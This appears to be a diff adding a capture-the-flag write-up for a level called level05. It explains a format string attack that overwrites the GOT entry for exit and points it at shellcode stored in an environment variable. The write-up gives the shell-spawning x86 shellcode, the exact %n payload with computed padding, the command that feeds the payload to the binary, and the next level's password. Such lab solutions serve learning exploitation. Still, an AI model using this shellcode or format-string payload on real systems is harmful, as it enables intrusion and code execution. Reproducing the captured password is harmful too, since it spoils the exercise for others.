@@ -1,0 +1,25 @@
+In this level, the program read from input with gets and drectly print it using printf and exit
+so we can do string format attack, by changing the exit entry in GOT
+first we find the address of exit and then define a shellcode to run instead
+
+export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+
+after that we get its address and we try to override exit with it
+
+but the address is too big to be directly printed with printf using %n, so we will divide it
+
+exit address is 0x080497e0 so we wil write in 0x080497e0 and 0x080497e2
+
+supposing that the address of env variable is 0xffffd886, we will write 0xd886 in 0x080497e0 and 0xffff in 0x080497e2
+
+we can find that they are in 10th and 11th arguments of printf
+
+python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08' + '%55422d%10\$n%10105d%11\$n'" > /tmp/level06
+
+
+cat /tmp/level06 - | ./level05
+
+...
+cd ../level06
+cat .pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
